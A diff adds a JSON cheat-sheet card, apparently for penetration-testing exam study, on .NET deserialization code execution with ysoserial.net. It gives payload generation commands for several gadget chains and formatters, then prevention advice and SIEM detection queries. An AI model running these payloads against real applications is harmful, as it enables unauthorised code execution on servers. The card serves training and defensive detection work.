@@ -1,0 +1,108 @@
+{
+  "id": "deser-dotnet-ysoserial",
+  "name": "ysoserial.net - .NET Deserialization RCE",
+  "command": "ysoserial.exe -g <gadget_chain> -f <formatter> -c \"<command>\" -o base64",
+  "description": "ysoserial.net builds malicious .NET serialized payloads that exploit gadget chains such as TypeConfuseDelegate and ActivitySurrogateSelector against insecure formatters (BinaryFormatter, LosFormatter, SoapFormatter, ObjectStateFormatter, and Json.NET with TypeNameHandling enabled). When an application deserializes attacker data with these formatters, the gadget chain yields remote code execution.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "pwntester/ysoserial.net",
+  "tags": [
+    "deserialization",
+    "ysoserial.net",
+    "dotnet",
+    "binaryformatter",
+    "typeconfusedelegate",
+    "json.net",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY A .NET SERIALIZED SINK ===\n  # BinaryFormatter base64 payloads commonly start with AAEAAAD.\n  # Watch for __VIEWSTATE, SOAP bodies, Json.NET with \"$type\" keys, or binary blobs in params/cookies.\n\n=== BASIC RCE PAYLOADS ===\n  ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" -o base64\n  ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"cmd /c whoami > C:\\\\temp\\\\o.txt\" -o base64\n  ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c \"cmd /c whoami\" -o raw\n  # ActivitySurrogateSelector may need the DisableActivitySurrogateSelectorTypeCheck gadget first on newer .NET:\n  ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c \"ExploitClass.cs;System.dll\" -o base64\n\n=== JSON.NET (TypeNameHandling != None) ===\n  ysoserial.exe -g ObjectDataProvider -f Json.Net -c \"calc\" -o raw\n  # Vulnerable config: JsonConvert.DeserializeObject(data, new JsonSerializerSettings{ TypeNameHandling = TypeNameHandling.All })\n\n=== FORMATTERS (-f) ===\n  BinaryFormatter, LosFormatter, SoapFormatter, ObjectStateFormatter,\n  NetDataContractSerializer, Json.Net, DataContractSerializer, XmlSerializer\n\n=== GADGETS (-g), list all ===\n  ysoserial.exe --fullhelp\n  # Popular: TypeConfuseDelegate, ActivitySurrogateSelector, ObjectDataProvider,\n  #          WindowsIdentity, PSObject, TextFormattingRunProperties (for ViewState)\n\n=== OUTPUT (-o) ===\n  base64 | raw | hex       # match how the sink expects the blob\n\n=== ALTERNATIVES ===\n  ViewState abuse (-p ViewState ...) when the sink is ASP.NET __VIEWSTATE - see deser-dotnet-viewstate\n  Freddy / Burp for sink discovery",
+  "examples": [
+    {
+      "label": "TypeConfuseDelegate + BinaryFormatter",
+      "command": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c \"calc\" -o base64"
+    },
+    {
+      "label": "Json.NET TypeNameHandling RCE",
+      "command": "ysoserial.exe -g ObjectDataProvider -f Json.Net -c \"calc\" -o raw"
+    },
+    {
+      "label": "ActivitySurrogateSelector raw payload",
+      "command": "ysoserial.exe -g ActivitySurrogateSelector -f BinaryFormatter -c \"cmd /c whoami\" -o raw"
+    }
+  ],
+  "references": [
+    {
+      "title": "pwntester/ysoserial.net",
+      "url": "https://github.com/pwntester/ysoserial.net"
+    },
+    {
+      "title": "PortSwigger - Insecure deserialization",
+      "url": "https://portswigger.net/web-security/deserialization"
+    },
+    {
+      "title": "OWASP Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "prereq"
+    },
+    {
+      "id": "deser-dotnet-viewstate",
+      "note": "ASP.NET __VIEWSTATE abuse with the ViewState plugin.",
+      "rel": "next"
+    },
+    {
+      "id": "deser-java-ysoserial",
+      "note": "Java equivalent using ysoserial.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "BinaryFormatter / LosFormatter / SoapFormatter reconstruct arbitrary object graphs and invoke their callbacks, and Json.NET with TypeNameHandling honors a $type field that lets an attacker pick the type instantiated. Gadget chains already present in the .NET framework turn that into code execution.",
+    "prerequisites": "An endpoint deserializing attacker data with an insecure formatter (BinaryFormatter et al.) or Json.NET configured with TypeNameHandling other than None.",
+    "impact": "Remote code execution in the IIS/application worker process (often as an app-pool or service identity).",
+    "detection": "[MITRE T1190] Requests carrying AAEAAAD base64 blobs or SOAP/Json payloads with embedded $type; [MITRE T1059] w3wp.exe or the app host spawning cmd.exe/powershell.exe.",
+    "artifacts": "IIS logs with AAEAAAD or $type payloads; Sysmon/EDR process tree w3wp.exe -> cmd.exe/powershell.exe; new files written under inetpub/temp.",
+    "splunk_spl": "index=iis (cs_uri_query=\"*AAEAAAD*\" OR request_body=\"*$type*\")\n| table _time, c_ip, cs_uri_stem, cs_uri_query",
+    "elastic_kql": "http.request.body.content:(*AAEAAAD* or *\\$type*) or url.query:*AAEAAAD*",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"w3wp.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+    "sigma_rules": "web_dotnet_deserialization_aaeaaad_or_w3wp_child",
+    "prevention": "Stop using BinaryFormatter/SoapFormatter/LosFormatter (Microsoft has deprecated BinaryFormatter); set Json.NET TypeNameHandling to None; sign/encrypt ViewState with a protected machineKey; bind a SerializationBinder allowlist; run app pools with least privilege.",
+    "sources": [
+      "pwntester/ysoserial.net",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "IIS worker (w3wp.exe) spawning a shell",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"w3wp.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"certutil.exe\",\"bitsadmin.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1059"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Rare legitimate admin tooling that shells out from IIS",
+        "tuning": "Alert on any w3wp child shell in production; correlate with AAEAAAD request signatures"
+      }
+    ]
+  }
+}
